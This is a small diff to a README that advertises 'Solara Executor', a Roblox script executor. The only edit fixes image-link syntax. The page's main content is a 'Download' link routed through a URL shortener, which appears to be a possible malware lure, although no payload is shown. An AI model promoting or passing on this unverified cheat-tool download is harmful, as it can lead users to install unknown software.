@@ -1,6 +1,6 @@
 # 🚀 Solara Executor - Ultimate Roblox Script Executor
 
-[![Solara]((https://avatars.mds.yandex.net/get-vthumb/4735571/1f1fa143ebc9ef732a0f087ebb9bdea8/800x450))](https://urlr.me/Tzp7YZ)
+[![Solara](https://avatars.mds.yandex.net/get-vthumb/4735571/1f1fa143ebc9ef732a0f087ebb9bdea8/800x450)](https://urlr.me/Tzp7YZ)
 
 ## [*Download Solara Executor*](https://urlr.me/Tzp7YZ)
 ## Overview
